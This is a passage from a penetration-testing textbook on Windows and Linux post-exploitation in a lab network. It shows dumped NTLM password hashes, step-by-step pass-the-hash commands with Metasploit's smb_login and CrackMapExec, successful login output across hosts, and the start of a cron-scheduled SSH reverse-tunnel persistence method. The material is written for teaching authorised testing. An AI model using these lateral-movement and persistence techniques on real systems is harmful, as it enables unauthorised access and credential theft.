Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:6769dd01f1f8b61924785
de2d467a41:::
tien:1001:aad3b435b51404eeaad3b435b51404ee:5266f28043fab71a085eba2e392d388
:::
meterpreter >
It’s best to repeat this next process from section 8.6.1 for all local user account pass-
word hashes you obtain. But for the sake of illustration, I’m going to use only the local
administrator account. You can always identify this account on Windows systems
because the UID is set to 500. By default, the name of the account is Administrator.
Sometimes IT system administrators rename the account in an attempt to hide it.
Unfortunately, Windows does not allow you to modify the UID, so there is no mistak-
ing the account.
Now that you’ve obtained some local account password hashes, the next logical step is
to use them to try to authenticate to other systems on the network. This process of tak-
ing a hash obtained from one system and attempting to log in to other systems with it
is once again called passing the hash. 
8.6.1
Using the Metasploit smb_login module
Due to the popularity of the Pass-the-Hash attack, several tools are available to get the
job done. Sticking with the primary workhorse of this pentest, let’s continue using
Metasploit. The smb_login module can be used to test for shared credentials against
Windows systems. It accepts clear-text passwords, which you may recall we used in
chapter 4. Additionally, it accepts password hashes. Here is how to use the module
with a password hash.
What if local admin is disabled?
It’s true that you can disable the local administrator account, which is considered by
many to be a best practice. After all, doing so prevents attackers from using the local
password hashes to spread throughout the network. 
That said, in almost every case where I’ve seen the UID 500 account disabled, the
IT system administrators have created a separate account with administrator privi-
leges, which completely defeats the purpose of disabling the default local admin
account.
151
Moving laterally with Pass-the-Hash
 If you already have the msfconsole running and are sitting at the Meterpreter
prompt from your recent exploit, type the background command to exit the Meter-
preter prompt and return to the main msfconsole prompt.
 In msfconsole, type use auxiliary/scanner/smb/smb_login at the command
prompt to load the smb_login module. Next, specify the name of the user account you
want to test with the command: set user administrator. Specify the hash for the
local administrator account with the command set smbpass [HASH]. The smbdomain
option can be used to specify an Active Directory domain. 
WARNING
It’s critical to be cautious with the smbdomain setting, because
brute-force guessing Active Directory account passwords will most likely result
in locking out users’ accounts. That won’t make your client happy. Even
though the default behavior in Metasploit is not to do this, I recommend
explicitly setting the value to “.” In Windows, this means the local workgroup.
It will force Metasploit to attempt to authenticate as a local user account and
not a domain user account. 
Finally, set the rhosts and threads options appropriately, and run the module. The
output in the following listing shows what it looks like when the smb_login module
has successfully authenticated to a remote host using the provided username and pass-
word hash.
msf5 exploit(windows/smb/ms17_010_psexec) > use
auxiliary/scanner/smb/smb_login 
msf5 auxiliary(scanner/smb/smb_login) > set smbuser administrator
smbuser => administrator
msf5 auxiliary(scanner/smb/smb_login) > set smbpass
aad3b435b51404eeaad3b435b51404ee:c1ea09ab1bab83a9c9c1f1c366576737
smbpass => aad3b435b51404eeaad3b435b51404ee:c1ea09ab1bab83a9c9c1f1c366576737 
msf5 auxiliary(scanner/smb/smb_login) > set smbdomain .
smbdomain => .
msf5 auxiliary(scanner/smb/smb_login) > set rhosts
file:/home/royce/capsulecorp/discovery/hosts/windows.txt
rhosts => file:/home/royce/capsulecorp/discovery/hosts/windows.txt
msf5 auxiliary(scanner/smb/smb_login) > set threads 10
threads => 10
msf5 auxiliary(scanner/smb/smb_login) > run
[*] 10.0.10.200:445       - 10.0.10.200:445 - Starting SMB login bruteforce
[*] 10.0.10.201:445       - 10.0.10.201:445 - Starting SMB login bruteforce
[*] 10.0.10.208:445       - 10.0.10.208:445 - Starting SMB login bruteforce
[*] 10.0.10.207:445       - 10.0.10.207:445 - Starting SMB login bruteforce
[*] 10.0.10.205:445       - 10.0.10.205:445 - Starting SMB login bruteforce
[*] 10.0.10.206:445       - 10.0.10.206:445 - Starting SMB login bruteforce
[*] 10.0.10.202:445       - 10.0.10.202:445 - Starting SMB login bruteforce
[*] 10.0.10.203:445       - 10.0.10.203:445 - Starting SMB login bruteforce
[-] 10.0.10.201:445       - 10.0.10.201:445 - Failed:
'.\administrator:aad3b435b51404eeaad3b435b51404ee:c1ea09ab1bab83a9c9c1f1c3
6576737',
Listing 8.9
Passing the hash with Metasploit
152
CHAPTER 8
Windows post-exploitation
[+] 10.0.10.208:445       - 10.0.10.208:445 – Success    
'.\administrator:aad3b435b51404eeaad3b435b51404ee:c1ea09ab1bab83a9c9c1f1c3
6576737' Administrator   
[+] 10.0.10.207:445       - 10.0.10.207:445 – Success    
'.\administrator:aad3b435b51404eeaad3b435b51404ee:c1ea09ab1bab83a9c9c1f1c3
6576737' Administrator   
[-] 10.0.10.200:445       - 10.0.10.200:445 - Failed:
'.\administrator:aad3b435b51404eeaad3b435b51404ee:c1ea09ab1bab83a9c9c1f1c3
6576737',
[*] Scanned 1 of 8 hosts (12% complete)
[*] Scanned 2 of 8 hosts (25% complete)
[-] 10.0.10.203:445       - 10.0.10.203:445 - Failed: 
'.\administrator:aad3b435b51404eeaad3b435b51404ee:c1ea09ab1bab83a9c9c1f1
c366576737',
[-] 10.0.10.202:445       - 10.0.10.202:445 - Failed: 
'.\administrator:aad3b435b51404eeaad3b435b51404ee:c1ea09ab1bab83a9c9c1f1
c366576737',
[*] Scanned 6 of 8 hosts (75% complete)
[-] 10.0.10.206:445       - 10.0.10.206:445 - Could not connect
[-] 10.0.10.205:445       - 10.0.10.205:445 - Could not connect
[*] Scanned 7 of 8 hosts (87% complete)
[*] Scanned 8 of 8 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_login) >
8.6.2
Passing-the-hash with CrackMapExec
You may recall from a previous chapter that we used CrackMapExec (CME) to guess
passwords against Windows hosts. It is also possible to use password hashes instead of
passwords to authenticate using CME. Instead of specifying the -p option for pass-
word, specify the -H option for your hash. CME is intuitive enough that you can ignore
the LM portion of the hash and only provide the last 32 characters: the NTLM por-
tion. Table 8.4 shows the local account password hash extracted from section 8.6 bro-
ken into its two versions, LM and NTLM.
As a reminder, LM hashes were used before Windows XP and Windows 2003 when
NTLM hashes were introduced. This means you are unlikely to encounter a Windows
network that doesn’t support NTLM hashes—at least until long after Microsoft intro-
duces a newer version.
Table 8.4
Windows local account hash structure
LAN Manager (LM)
New Technology LAN Manager (NTML)
First 32 characters
Second 32 characters
aad3b435b51404eeaad3b435b51404ee
c1ea09ab1bab83a9c9c1f1c366576737
As expected, a successful login to the host
from which you extracted hashes
Newly accessible level-two host
that shares the same local
administrator password
153
Moving laterally with Pass-the-Hash
TIP
Commit to memory at least the first six or seven characters of this string:
“aad3b435b51404eeaad3b435b51404ee.” This is the LM hashed equivalent of
an empty string, meaning there is no LM hash, further meaning that LM
hashes aren’t supported or in use on this system. If you ever see anything
other than this value in the LM portion of a hash, you should immediately
write up a critical severity finding in your report, as discussed in more detail
in chapter 12.
Using only the NTLM portion of your hash, you can perform the Pass-the-Hash tech-
nique with CrackMapExec using the following command all on one line:
cme smb capsulecorp/discovery/hosts/windows.txt --local-auth -u
➥ Administrator -H c1ea09ab1bab83a9c9c1f1c366576737
The output in listing 8.10 shows exactly the same information as the Metasploit mod-
ule, with an additional bonus: it includes the hostnames of the two systems that are
now accessible. TIEN was already accessible because it was missing the MS17-010 secu-
rity patch and could be exploited using Metasploit. 
CME          10.0.10.200:445 GOKU            [*] Windows 10.0 Build 17763
(name:GOKU) (domain:CAPSULECORP)
CME          10.0.10.207:445 RADITZ          [*] Windows 10.0 Build 14393
(name:RADITZ) (domain:CAPSULECORP)
CME          10.0.10.208:445 TIEN            [*] Windows 6.1 Build 7601
(name:TIEN) (domain:CAPSULECORP)
CME          10.0.10.201:445 GOHAN           [*] Windows 10.0 Build 14393
(name:GOHAN) (domain:CAPSULECORP)
CME          10.0.10.202:445 VEGETA          [*] Windows 6.3 Build 9600
(name:VEGETA) (domain:CAPSULECORP)
CME          10.0.10.203:445 TRUNKS          [*] Windows 6.3 Build 9600
(name:TRUNKS) (domain:CAPSULECORP)
CME          10.0.10.207:445 RADITZ          [+] RADITZ\Administrator
c1ea09ab1bab83a9c9c1f1c366576737 (Pwn3d!)  
CME          10.0.10.200:445 GOKU            [-] GOKU\Administrator
c1ea09ab1bab83a9c9c1f1c366576737 STATUS_LOGON_FAILURE 
CME          10.0.10.201:445 GOHAN           [-] GOHAN\Administrator
c1ea09ab1bab83a9c9c1f1c366576737 STATUS_LOGON_FAILURE 
CME          10.0.10.203:445 TRUNKS          [-] TRUNKS\Administrator
c1ea09ab1bab83a9c9c1f1c366576737 STATUS_LOGON_FAILURE 
CME          10.0.10.202:445 VEGETA          [-] VEGETA\Administrator
c1ea09ab1bab83a9c9c1f1c366576737 STATUS_LOGON_FAILURE 
CME          10.0.10.208:445 TIEN            [+] TIEN\Administrator
c1ea09ab1bab83a9c9c1f1c366576737 (Pwn3d!)
Listing 8.10
Using CrackMapExec to pass the hash
RADITZ is a newly accessible level-two host that 
shares the same local administrator password.
As expected, a successful login to the 
host from which you extracted hashes
154
CHAPTER 8
Windows post-exploitation
RADITZ is the newly accessible level-two host that appears to be using the same set of
credentials for the local administrator account. Compromising this host will be easy
with administrator credentials. Now you can access all your level-two hosts and per-
form the post-exploitation techniques from this chapter on those systems, potentially
unlocking access to even more systems. You should rinse and repeat for any new tar-
gets that become accessible to you. 
Summary
 The three key objectives during post-exploitation are maintaining reliable re-
entry, harvesting credentials, and moving laterally.
 You can use the persistence Meterpreter script for an automated long-term con-
nection to compromised targets.
 You can obtain credentials in the form of local account password hashes,
domain cached credentials, and clear-text passwords from memory or configu-
ration files.
 Password cracking with a dictionary file is more practical than pure brute-force
guessing. The trade-off is that it takes less time but will get you fewer passwords.
 You should try to log in to other systems using the credentials you’ve obtained.
Exercise 8.1: Accessing your first level-two host
Using the local user account password hashes obtained from tien.capsulecorp
.local . . ., perform the Pass-the-Hash technique with either Metasploit or CME. Find
the newly accessible RADITZ system, which previously had no known attack vectors
but is accessible because it shares credentials with TIEN. There is a file called
c:\flag.txt on the raditz.capsulecorp.local server. What is in the file?
The answer is in appendix E.
155
Linux or
 UNIX post-exploitation
In the last chapter, we discussed the three main components of Windows post-
exploitation, which you will recall are the following:
 Maintaining reliable re-entry
 Harvesting credentials
 Moving laterally
These are the same for Linux- or UNIX-based systems; the only difference is the tech-
niques used to do them. A strong pentester is OS-agnostic. It doesn’t matter if you’re
on a Windows machine, FreeBSD UNIX, CentOS Linux, or macOS. You should
know enough about where to find credentials, how to establish reliable re-entry, and
how to move laterally to succeed during any engagement. In this chapter, you will
This chapter covers
 Harvesting credentials from .dot files
 Tunneling through SSH connections
 Automating SSH pubkey authentication with bash
 Scheduling a reverse callback using cron
 Escalating privileges with SUID binaries
156
CHAPTER 9
Linux or UNIX post-exploitation
learn several post-exploitation techniques for penetrating further into Linux or UNIX
environments. Let’s begin by quickly reviewing the three primary components (figure
9.1) of post-exploitation and privilege escalation.
 Looking at figure 9.1 from the bottom up, your primary objectives during post-
exploitation are maintaining reliable re-entry, harvesting credentials, and moving lat-
erally to newly accessible level-two targets. In the case of Linux or UNIX environ-
ments, one of the most effective ways to maintain reliable re-entry is to schedule a
callback connection using cron jobs. That’s what you’ll learn to do in the next section.
DEFINITION
Linux and UNIX systems have a built-in subsystem called cron,
which executes scheduled commands at predetermined intervals. A crontab is
a file with a list of entries that define when cron should execute a command
and which command to execute.
9.1
Maintaining reliable re-entry with cron jobs
In chapter 8, you learned about the importance of maintaining reliable re-entry into a
compromised target during a pentest. The Metasploit Meterpreter shell was used to
demonstrate a scheduled callback from the victim machine to your attacking platform.
Although a similar capability is possible using the exploit/linux/local/service_
persistence module from Metasploit, I want to show you an alternative method that
uses more of a living-off-the-land approach: scheduling a Linux or UNIX cron job that
sends you a reverse shell connection automatically each time the job is run by the OS.
DEFINITION
When you hear pentesters or red teamers use the phrase living off
the land, it refers to relying only on tools that exist natively on the compro-
mised OS. This is done to minimize your attack footprint and decrease your
overall likelihood of being detected by an endpoint detection and response
(EDR) solution during your engagement.
C. Repeat password guessing
   using discovered credentials
   and SSH keys to unlock
   access to level-2 targets.
B. Locate clear-text and hashed
   credentials from all level-1
   targets.
A. Establish an SSH tunnel that
    automatically connects back
    to you using cron.
Level 2: Newly accessible targets
Move laterally
Pass stolen SSH keys
Search bash history records
Search config files
Search user .dot files and
directories
Automate reverse callback
with cron
Harvest credentials
Maintain reliable re-entry
Level 1: Initial compromised targets
Figure 9.1
Post-exploitation goals and objectives
157
Maintaining reliable re-entry with cron jobs
Because you’re a professional pentester and the security of your client is important to
you, the safest way to establish reliable re-entry with cron jobs is to upload a set of SSH
keys to the target system, create a bash script that initiates an outbound SSH connec-
tion to your attacking machine, and then configure the crontab to run the bash script
automatically. Using a unique SSH key that you create specifically for this system will
ensure that the compromised system will authenticate only to your attacking machine
when the cron job is run. Here is how to set everything up (see figure 9.2):
1
Create a new pair of SSH keys.
2
Upload them to the compromised target.
3
Create a bash script on the compromised target that uses the SSH keys to initi-
ate an SSH tunnel to your attacking system.
4
Schedule a crontab entry to run the bash script.
9.1.1
Creating an SSH key pair
To set up SSH key authentication from your victim machine to your attacking
machine, you need to use the ssh-keygen command to create the public and private
key pairs on the victim machine, and then copy the public key to your attacking
machine. Because you’ve already escalated to root, as I have demonstrated using the
Capsulecorp Pentest network, switch to the root user’s .ssh directory and issue the
ssh-keygen -t rsa command to generate the new key pair (listing 9.1). 
WARNING
Be sure to specify a unique name for the key so you don’t acciden-
tally overwrite any existing SSH keys for the root user. 
In this instance, it’s OK to leave the password field blank so the cron job can execute seam-
lessly and authenticate to your attacking machine without prompting for a password.
A. Upload a fresh pair 
    of SSH keys to the 
    compromised target.
B. Create a bash script
    that will use the SSH
    keys to connect back
    to your attacking
    machine, establishing
    a tunnel to the
    compromised target.
Penetration tester
SSH keys
Compromised
target
Crontab entry
runs bash
script
Bash script to